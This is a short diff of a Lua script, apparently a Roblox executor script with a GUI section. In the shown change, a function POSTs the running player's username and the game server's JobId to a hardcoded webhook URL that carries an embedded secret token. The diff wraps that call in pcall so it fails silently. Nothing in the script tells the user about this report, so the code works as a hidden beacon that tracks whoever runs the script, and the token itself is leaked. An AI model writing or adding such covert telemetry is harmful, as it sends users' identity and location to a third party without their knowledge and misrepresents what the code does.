@@ -208,9 +208,9 @@ function send(ss)
 http_request({Url="https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez",Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=ss})})
 end
 
-
+pcall(function()
 send(game.Players.LocalPlayer.Name .. ' | ' .. game.JobId)
-
+	end)
 do  -- // GUI
 
 	function GUI()
